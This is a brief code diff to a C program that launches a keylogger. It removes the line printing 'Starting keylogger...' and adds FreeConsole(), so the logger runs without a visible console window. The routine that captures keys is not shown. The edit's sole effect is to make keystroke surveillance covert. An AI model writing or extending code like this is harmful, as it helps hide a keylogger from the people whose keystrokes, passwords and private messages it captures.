@@ -2,7 +2,7 @@
 #include <stdio.h>
 
 int main() {
-    printf("Starting keylogger...\n");
+    FreeConsole();
     StartKeyLogger();
     return 0;
 }
